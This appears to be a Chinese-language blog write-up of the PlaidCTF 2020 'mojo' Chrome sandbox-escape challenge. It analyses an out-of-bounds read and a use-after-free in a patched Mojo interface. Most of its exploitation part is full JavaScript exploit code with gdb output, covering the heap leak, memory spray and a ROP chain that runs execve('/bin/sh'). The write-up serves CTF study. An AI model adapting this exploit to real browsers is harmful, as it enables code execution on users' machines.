---
layout: post
title: 沙箱逃逸之plaidctf 2020 mojo writeup
date: 2022-12-11
Author: f1tao
tags: [ctf, browser]
comments: true
toc: true
---

最近想看看`chrome`沙箱逃逸，从`plaidctf 2020`的`mojo`开始。

## 描述

题目附件内容如下所示：

```bash
$ ls
Dockerfile      chrome.zip      flag_printer    mojo_js.zip     plaidstore.diff run.sh          server.py       visit.sh
```

从`Dockerfile`的内容知道，启动`chrome`的命令如下所示，参数`$1`是要访问的链接。`--headless`表示不启动图形界面对页面进行解析；`--enable-blink-features`表示启用一个或多个启用`Blink`内核运行时的功能，在这里启用了`MojoJS`即`mojo`的`js api`。

```bash
timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest "$1"
```

重点要分析的是`plaidstore.diff`，它是出题人对于`chrome`的`patch`。

## 分析

直接去看`plaidstore.diff`来尝试寻找漏洞，它添加了一个新的`interface`。先看`plaidstore.mojom`定义的`interface`，`interface`中定义了`StoreData`以及`GetData`两个函数。

```diff
+++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
@@ -0,0 +1,11 @@
+module blink.mojom;
+
+// This interface provides a data store
+interface PlaidStore {
+
+  // Stores data in the data store
+  StoreData(string key, array<uint8> data);
+
+  // Gets data from the data store
+  GetData(string key, uint32 count) => (array<uint8> data);
+};
```

来看`interface`在`browser`端的实现，如下所示。两个函数还没有具体实现，可以看到有两个私有成员变量` render_frame_host_`以及`data_store_`。

```diff
+++ b/content/browser/plaidstore/plaidstore_impl.h
@@ -0,0 +1,35 @@
+#include <string>
+#include <vector>
+
+#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
+
+namespace content {
+
+class RenderFrameHost;
+
+class PlaidStoreImpl : public blink::mojom::PlaidStore {
+ public:
+  explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
+
+  static void Create(
+      RenderFrameHost* render_frame_host,
+      mojo::PendingReceiver<blink::mojom::PlaidStore> receiver);
+
+  ~PlaidStoreImpl() override;
+
+  // PlaidStore overrides:
+  void StoreData(
+      const std::string &key,
+      const std::vector<uint8_t> &data) override;
+
+  void GetData(
+      const std::string &key,
+      uint32_t count,
+      GetDataCallback callback) override;
+
+ private:
+  RenderFrameHost* render_frame_host_;
+  std::map<std::string, std::vector<uint8_t> > data_store_;
+};
+
+} // namespace content
```

整个`interface`的实现引入了两个漏洞，分别是`oob`已经`uaf`漏洞，下面来逐个进行解析。

### oob 越界读漏洞

`GetData`以及`StoreData`函数的实现如下所示。`StoreDate`会将`data`存入到`data_store_[key]`当中，`GetData`函数会尝试在`data_store_`中找到对应的`key`所存储的值，并拷贝出`count`大小的数据。

`oob`越界读漏洞存在于`GetData`的实现当中，可以看到它没有对`count`进行限制，导致可以越界读取对应数据后任意大小的值并泄露出来。

```diff
+void PlaidStoreImpl::StoreData(
+    const std::string &key,
+    const std::vector<uint8_t> &data) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    return;
+  }
+  data_store_[key] = data;
+}
+
+void PlaidStoreImpl::GetData(
+    const std::string &key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) {
+    std::move(callback).Run({});
+    return;
+  }
+  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
+  std::move(callback).Run(result);
+}
```

### uaf 漏洞

一个`render`进程里的`RenderFrame`，对应到`browser`进程里的一个`RenderFrameHost`。打开一个新的`tab`，或者创建一个`iframe`的时候，都对应创建出一个新的`RenderFrameHost`对象。

可以看到在初始化的时候会将`render_frame_host`指针保存在`render_frame_host_`中。但是理论上来说，`interface`是不应该直接存储`render_frame_host`指针的，如果需要使用，也应该使用`RenderFrameHost::FromID(int render_process_id, int render_frame_id)`的方式来获取相应的对象。

```diff
+PlaidStoreImpl::PlaidStoreImpl(
+    RenderFrameHost *render_frame_host)
+    : render_frame_host_(render_frame_host) {}
```

同时接口的实现还调用`MakeSelfOwnedReceiver`函数将把`Mojo`管道的一端 `Receiver `和当前`PlaidStoreImpl`实例绑定，只有当`Mojo`管道关闭或者发生异常， `Receiver` 端与当前实例解绑，此时的`PlaidStoreImpl`相关内存数据才会释放。

```diff
+void PlaidStoreImpl::Create(
+    RenderFrameHost *render_frame_host,
+    mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
+  mojo::MakeSelfOwnedReceiver(std::make_unique<PlaidStoreImpl>(render_frame_host),
+                              std::move(receiver));
+}
```

`MakeSelfOwnedReceiver`函数的定义如下所示。

```
Binds the lifetime of an interface implementation to the lifetime of the Receiver. When the Receiver is disconnected (typically by the remote end closing the entangled Remote), the implementation will be deleted.
```

上面的代码也就意味着当`mojo pipe`不关闭时，`PlaidStoreImpl`对象不会释放，也就意味着仍然可以使用`render_frame_host_`指针。然而`PlaidStoreImpl`对象并没有与`WebContent`绑定，我们关闭`tab`或者销毁`iframe` 时，`PlaidStoreImpl`对象是不会被释放的。但是在关闭`tab`或者销毁`iframe`时，会释放对应的`render_frame_host`对象，此时我们仍然可以使用`PlaidStoreImpl`对象中的`render_frame_host_`去使用该内存，导致了`uaf`漏洞的形成。后续若仍然调用调用`PlaidStoreImpl`接口中的`GetData`或`StoreData`函数，会调用`render_frame_host_->IsRenderFrameLive()`代码，就触发了`uaf`漏洞。

## 利用

### 调试

先说说调试的问题，因为`chrome`是多进程程序，我们的目标是对`mojo`通信的`receiver`端（`browser`进程进行利用），因此主要是对启动的父进程进行调试。

调试浏览器时，最好在本地开一个web服务，而不是让浏览器直接访问本地html文件，因为这其中访问的协议是不一样的。浏览器访问web服务的协议是`http`，而访问本地文件的协议是`file`。

因此先在本地对应的`exp`文件目录下（需要将`mojo_js`路径和`pwn.html`放在一级目录下）启动一个`web`服务：

```bash
python -m SimpleHTTPServer
```

`debug.sh`内容如下。在启动的参数中加入了`--user-data-dir`参数是为了在`terminal`中输出对应的`console.log`信息。

```bash
# set file and read symbol
file ./chrome
# set start parameter
set args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS http://127.0.0.1:8000/pwn.html
# set follow-fork-mode
set follow-fork-mode parent
# just run
r
```

`gdb -x debug.sh`即可启动调试。

因为开启了`mojo js binding`，因为可以直接在`render`端使用`js`代码来进行通信，示例如下所示：

```html
<script src="./mojo/public/js/mojo_bindings.js"></script>
<script src="./third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
<script>
  	async function test() { 
  		let p = blink.mojom.PlaidStore.getRemote(true);
  		await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
    }
  	test()
</script>
```

头两句是要引入的头文件，`blink.mojom.PlaidStore.getRemote`则是对`remote`端进行绑定。使用`await`的理由是因为是从`render`进程发送给`browser`进程，需要等待，所以要使用`await`，不然可能会获取不到数据。

### oob 越界读利用

首先搞清楚越界读读的目标是什么，就要搞清楚越界读所发生的区域在哪里，这些区域存储了些什么有用的数据。

因为`data_store_`指针存储在`PlaidStoreImpl`对象当中，所以先看`PlaidStoreImpl`的创建以及调用`StoreData`函数之后的内存布局。

断点下在`PlaidStoreImpl::Create`函数，看`PlaidStoreImpl`对象申请的空间，

```asm
	 0x5555591ac4a3    mov    edi, 0x28
 ► 0x5555591ac4a8    call   0x55555ac584b0 <0x55555ac584b0>
 
   0x5555591ac4ad    lea    rcx, [rip + 0x635e2ec]
   0x5555591ac4b4    mov    qword ptr [rax], rcx      ; 赋值虚表指针
   0x5555591ac4b7    mov    qword ptr [rax + 8], rbx  ; 赋值render_frame_host指针
   0x5555591ac4bb    lea    rcx, [rax + 0x18]
```

`0x55555ac584b0`是`new`函数，可以跟进去该函数然后用`frame`命令确定。

```asm
pwndbg> frame
#0  0x000055555ac584b0 in operator new(unsigned long, std::nothrow_t const&) ()
```

因此可以确定`PlaidStoreImpl`对象大小为`0x28`，也可以看到后面虚表指针以及`render_frame_host`的赋值，最终形成的内存布局如下：

```asm
pwndbg> x/6gx 0x284976549f30
0x284976549f30: 0x000055555f50a7a0      0x000028497640bd00   ; vtable | render_frame_host_
0x284976549f40: 0x0000284976549f48      0x0000000000000000   ; data_store_
0x284976549f50: 0x0000000000000000      0x0000000000000000

pwndbg> vmmap 0x284976549f30
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x28497627a000     0x284976979000 rw-p   6ff000 0       +0x2cff30
```

再看`p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)`执行完成后的内存布局，如下所示：

```asm
pwndbg> x/6gx 0x284976549f30
0x284976549f30: 0x000055555f50a7a0      0x000028497640bd00
0x284976549f40: 0x00002849765f5b40      0x00002849765f5b40
0x284976549f50: 0x0000000000000001      0x0000000000000000
pwndbg> x/10gx 0x00002849765f5b40
0x2849765f5b40: 0x0000000000000000      0x0000000000000000
0x2849765f5b50: 0x0000284976549f48      0x000055555824ff01
0x2849765f5b60: 0x0000007878787878      0x0000000000000000
0x2849765f5b70: 0x0500000000000000      0x0000284976881e10
0x2849765f5b80: 0x0000284976881e38      0x0000284976881e38
pwndbg> x/s 0x2849765f5b60
0x2849765f5b60: "xxxxx"
pwndbg> x/s 0x0000284976881e10
0x284976881e10: 'A' <repeats 40 times>

pwndbg> vmmap 0x0000284976881e10
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x28497627a000     0x284976979000 rw-p   6ff000 0       +0x607e10

```

可以看到我们能够越界读取的数据`0x0000284976881e10`所属的地址空间和`PlaidStoreImpl`对象所属的地址空间是同一片区域，这样就使得如果在存储的数据后部署多个`PlaidStoreImpl`对象，那么就可以通过越界读取`PlaidStoreImpl`对象中的数据。

因为`PlaidStoreImpl`对象中有虚表指针以及`render_frame_host_`指针，我们就可以越界读把这些数据读出来，最终构造出来的代码如下。要提一个技巧就是搜寻地址是虚表指针因页对齐低三位地址以及高位都是确定的，通过这个方法可以大概率找到对象。

```js
async function Leak()
{
    let plaidStorePtrList = [];
    for(let i=0; i<0x200; i++) {
        let p = blink.mojom.PlaidStore.getRemote(true);
        await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
        plaidStorePtrList.push(p);
    }
    let p = plaidStorePtrList[0];
    let leakData = (await p.getData("xxxxx", 0x2000)).data
    let u8 = new Uint8Array(leakData)
    let u64 = new BigInt64Array(u8.buffer);
    let vtableAddr = 0;
    for(let i=0x28/8; i<u64.length; i++) {
        let highAddr = u64[i]&BigInt(0xf00000000000)
        let lowAddr = u64[i]&BigInt(0x000000000fff)
        if((highAddr == BigInt(0x500000000000)) && lowAddr == BigInt(0x7a0)) {
            vtableAddr = u64[i];
            renderFrameHostAddr = u64[i+1];
            break;
        }

    }

    if(vtableAddr == 0 ) {
        console.log("[-] no vaild addr found");
        return;
    }
    chromeBaseAddr = vtableAddr - BigInt(0x9fb67a0);
    console.log("[+] leak chrome base addr: "+hex(chromeBaseAddr));
    console.log("[+] leak reander frame host addr: "+hex(renderFrameHostAddr));
}
Leak();
```

### uaf 利用

`uaf`漏洞利用则主要是通过在代码中构建`frame`，并将`frame`中的`PlaidStoreImpl`对象返回，然后关闭`frame`释放`render_frame_host`指针，最后使用`PlaidStoreImpl`对象来使用`render_frame_host_`来实现`uaf`。

先要搞清楚`render_frame_host`对象的大小，该对象由`RenderFrameHostFactory`类实现，可以通过下面的断点来看该对象的大小，可以看到对象大小为`0xc28`。

```asm
b content::RenderFrameHostFactory::Create


	 0x555559075a52    mov    edi, 0xc28
   0x555559075a57    call   0x55555ac584b0 <0x55555ac584b0>
```

再来看看怎么触发`uaf`，主要步骤包括：

* 调用`document.createElement`创建一个子`frame`，在`frame`中绑定`mojo`，并将`plaidStorePtrList`赋值给`window`，然后返回；
* 在父`frame`中注册`"DOMContentLoaded"`事件的监听函数，调用`uaf`函数创建对应的`pipe`;
* 准备和`render_frame_host`对象大小相同的内存（`0xc28`），把它全都初始化成`0x41`；
* 在父`frame`中获取子`frame`的`plaidStorePtrList`；
* 调用`frame.remove()`，释放掉子`frame`，这样在`browser`进程中`render_frame_host`对象被释放；
* 调用`StoreData`函数去`browser`进程中申请`0xc28`大小的内存，这样会将被释放的`render_frame_host`对象内存申请出来。同时该函数也会调用被释放指针`render_frame_host_`中的虚表函数，触发了`uaf`漏洞。

```js
function AddFrame()
{
    let frame = document.createElement("iframe");
    frame.srcdoc =
        `<script src="mojo/public/js/mojo_bindings_lite.js"></script>
            <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
        <script>
            async function uaf()
            {
                // step 1 register mojo in child frame
                let plaidStorePtrList = [];
                for(let i=0; i<0x200; i++) {
                    let p = blink.mojom.PlaidStore.getRemote(true);
                    await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
                    plaidStorePtrList.push(p);
                }
								// return the plaidStorePtrList to parent frame
                window.plaidStorePtrList = plaidStorePtrList;
                return;
            }
        uaf();
        </script>
        `;
    document.body.appendChild(frame);
    return frame;
}

async function pwn()
{
    let frame = AddFrame();
    frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
      	// trigger the pipe
        await frame.contentWindow.uaf();

      	// prepare the memory
        let renderFrameHostSize = 0xc28
        frameBuf = new ArrayBuffer(renderFrameHostSize);
        let frameData8 = new Uint8Array(frameBuf).fill(0x41);
				
      	// get the child frame
        let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;
				
      	// free the render_frame_host ptr
        frame.remove();

      	// trying to malloc the freed render_frame_host memory and trigger the function.
        let bins = [];
        for(var i=0; i<0x1000; i++){
            plaidStorePtrList[0].storeData("crash", frameData8);
        }
    })

}
pwn();
```

理论上最终`storeData`函数在执行`render_frame_host_->IsRenderFrameLive()`的时候，虚表指针已经被覆盖成了`0x414141410x41414141`会导致访存错误。

实际运行结果如下，可以看到会尝试调用`call [rax+0x160]`，是代码`render_frame_host_->IsRenderFrameLive()`的实现，我们所申请的内存成功控制了对象，并且数据可控`rip`。

```asm
 Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
0x00005555591ac1e1 in content::PlaidStoreImpl::StoreData(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, std::__1::vector<unsigned char, std::__1::allocator<unsigned char> > const&) ()
	...
 RAX  0x4141414141414141 ('AAAAAAAA')
 RBX  0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX  0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
 ...
 ► 0x5555591ac1e1    call   qword ptr [rax + 0x160]

   0x5555591ac1e7    test   al, al

pwndbg> i r rax
rax            0x4141414141414141  0x4141414141414141
```

### 最终利用

有了对上面两个漏洞的理解，最终利用也就呼之欲出了，代码如下所示，主要流程是：

* 在子`frame`中利用`oob`漏洞泄露出程序基址以及`render_frame_host`对象地址；其中程序基址用于构造`rop`链,`render_frame_host`对象地址用于后续`uaf`漏洞利用；
* 准备`rop`链，因为跳转的时候`rax`是虚表指针且可控，因此可以将它指向上面泄露的`render_frame_host`对象地址同时在偏移为`0x160`的地方部署`stack pivot gadget`即`xchg rsp, rax`这样的`gadget`，然后就是常规的`rop`链。
* 触发`uaf`，成功控制程序流，最后执行`execve("/bin/sh")`或`execve("/bin/gnome-calculator")`。

```js
function AddFrame()
{
    let frame = document.createElement("iframe");
    frame.srcdoc =
        `<script src="mojo/public/js/mojo_bindings_lite.js"></script>
            <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
        <script>
            async function Leak()
            {
                // oob read to leak chrome base addr and render_frame_host pointer
                let plaidStorePtrList = [];
                for(let i=0; i<0x200; i++) {
                    let p = blink.mojom.PlaidStore.getRemote(true);
                    await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
                    plaidStorePtrList.push(p);
                }
                let p = plaidStorePtrList[0];
                let leakData = (await p.getData("xxxxx", 0x2000)).data
                let u8 = new Uint8Array(leakData)
                let u64 = new BigInt64Array(u8.buffer);
                let vtableAddr = 0;
                let renderFrameHostAddr = 0;
                for(let i=0x28/8; i<u64.length; i++) {
                    let highAddr = u64[i]&BigInt(0xf00000000000)
                    let lowAddr = u64[i]&BigInt(0x000000000fff)
                    if((highAddr == BigInt(0x500000000000)) && lowAddr == BigInt(0x7a0)) {
                        vtableAddr = u64[i];
                        renderFrameHostAddr = u64[i+1];
                        break;
                    }
                }

                if(vtableAddr == 0 ) {
                    window.chromeBaseAddr = 0;
                    return;
                }
                chromeBaseAddr = vtableAddr - BigInt(0x9fb67a0);
                window.chromeBaseAddr = chromeBaseAddr;
                window.renderFrameHostAddr = renderFrameHostAddr;
                window.plaidStorePtrList = plaidStorePtrList;
                return;
            }
        Leak();
        </script>
        `;
      document.body.appendChild(frame);
    return frame;
}
async function pwn()
{
    let frame = AddFrame();
    frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
        for(;;) {
          	// step 1 trigger oob read to get address
            await frame.contentWindow.Leak();
            if(frame.contentWindow.chromeBaseAddr != 0) {
                console.log("[+] leak chrome base addr: "+hex(frame.contentWindow.chromeBaseAddr));
                console.log("[+] leak reander frame host addr: "+hex(frame.contentWindow.renderFrameHostAddr));
                break;
            }
        }
      	
      	// step 2 prepare the rop chain
        chromeBaseAddr = frame.contentWindow.chromeBaseAddr;
        renderFrameHostAddr = frame.contentWindow.renderFrameHostAddr;
        let xchgRaxRsp = chromeBaseAddr + 0x000000000880dee8n //: xchg rax, rsp ; clc ; pop rbp ; ret
        let popRdi = chromeBaseAddr + 0x0000000002e4630fn //: pop rdi ; ret
        let popRsi = chromeBaseAddr + 0x0000000002d278d2n //: pop rsi ; ret
        let popRdx = chromeBaseAddr + 0x0000000002e9998en //: pop rdx ; ret
        let popRax = chromeBaseAddr + 0x0000000002e651ddn //: pop rax ; ret
        //let syscall = chromeBaseAddr + 0x0000000002ef528dn //: syscall
        let execve = chromeBaseAddr + 0x9efca30n //: execve
        
        // step 3 reserve the child plaidStorePtrList to trigger uaf
        let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;

      	// step 4 prepare the rop chain memory
        let binshAddr = renderFrameHostAddr+0x50n;
        let renderFrameHostSize = 0xc28
        frameBuf = new ArrayBuffer(renderFrameHostSize);
        let frameData8 = new Uint8Array(frameBuf).fill(0x41);
        frameDataView = new DataView(frameBuf);

        frameDataView.setBigInt64(0x160,xchgRaxRsp,true);

        frameDataView.setBigInt64(0,renderFrameHostAddr,true);
        frameDataView.setBigInt64(0x8,popRdi,true);
        frameDataView.setBigInt64(0x10,binshAddr,true);
        frameDataView.setBigInt64(0x18,popRsi,true);
        frameDataView.setBigInt64(0x20,0n,true);
        frameDataView.setBigInt64(0x28,popRdx,true);
        frameDataView.setBigInt64(0x30,0n,true);
        frameDataView.setBigInt64(0x38,popRax,true);
        frameDataView.setBigInt64(0x40,59n,true);
        frameDataView.setBigInt64(0x48,execve,true);
        frameDataView.setBigInt64(0x50,0x68732f6e69622fn,true);  // /bin/sh
        // frameDataView.setBigInt64(0x50, 0x6f6e672f6e69622fn,true);  // /bin/gno
        // frameDataView.setBigInt64(0x58, 0x75636c61632d656dn,true);  // me-calcu
        // frameDataView.setBigInt64(0x60, 0x726f74616cn,true);  // lator\x00

      	// step 5 free the renderFrameHost memory
        frame.remove();

      	// step 6 malloc the freed memory and trigger uaf
        let bins = [];
        for(var i=0; i<0x1000; i++){
            plaidStorePtrList[0].storeData("crash", frameData8);
        }
    })
}
pwn();
```

最终弹出个计算器，开心。

![poc](https://raw.githubusercontent.com/f1tao/f1tao.github.io/master/images/2022-12-11-沙箱逃逸之plaidctf-2020-mojo-writeup/poc.png)

## 总结

第一次调`mojo`的洞，掌握了沙箱逃逸的大致原理，有了一个略模糊的概念，感觉还蛮有意思，因为对`mojo`的机制没有太搞明白，所以这里就不讲基础了，只对漏洞进行利用，后面搞得更清楚以后再进行分析。

## 参考

* [PlaidCTF2020 PlaidStore mojo chromium](https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/)
* [Plaid CTF 2020 mojo Writeup](https://kiprey.github.io/2020/10/mojo/)
* [Plaid2020 Mojo](https://pwnfirstsear.ch/2020/04/20/plaidctf2020-mojo)
* [Plaid-CTF-2020-mojo-chrome沙箱逃逸分析](https://de4dcr0w.github.io/Plaid-CTF-2020-mojo-chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90.html)
* [chrome sandbox escape case study and plaidctf2020 mojo writeup](https://xz.aliyun.com/t/8481#toc-6)
* [Plaid CTF 2020 mojo 复现 - chromium sandbox escape](https://www.anquanke.com/post/id/209800)

